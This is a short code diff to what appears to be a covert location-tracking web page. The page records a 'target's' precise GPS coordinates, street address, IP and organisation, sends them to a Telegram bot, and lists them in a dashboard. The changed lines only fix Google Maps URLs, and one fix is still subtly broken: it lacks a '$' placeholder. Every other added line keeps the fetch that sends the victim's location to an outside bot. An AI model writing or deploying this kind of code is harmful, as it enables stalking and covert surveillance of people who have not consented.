@@ -149,7 +149,7 @@
                     } catch(e) {}
 
                     updateLog(target, lat, lon, fullAddr);
-                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> GPS OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
+                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("🎯 <b>" + target + "</b> GPS OK\n📍 " + fullAddr + "\n🗺️ Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                     finish();
                 }, finish, { enableHighAccuracy: true, timeout: 5000 });
             } else { finish(); }
@@ -204,7 +204,7 @@
                     <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-gray-500 italic">${l.org || ''}</span></td>
                     <td class="p-4 text-gray-300 text-[9px] leading-relaxed max-w-[200px]">${l.address || 'Đang lấy...'}</td>
                     <td class="p-4 text-right">
-                        ${l.st === 'GPS' ? `<a href="https://www.google.com/maps?q=lat,lon{l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black">MAP</a>` : `<span class="text-gray-700 italic text-[9px]">IP ONLY</span>`}
+                        ${l.st === 'GPS' ? `<a href="https://www.google.com/maps?q={l.lat},${l.lon}" target="_blank" class="bg-green-600/20 text-green-500 border border-green-600/30 px-2 py-1 rounded text-[9px] font-black">MAP</a>` : `<span class="text-gray-700 italic text-[9px]">IP ONLY</span>`}
                     </td>
                 </tr>
             `).join('');
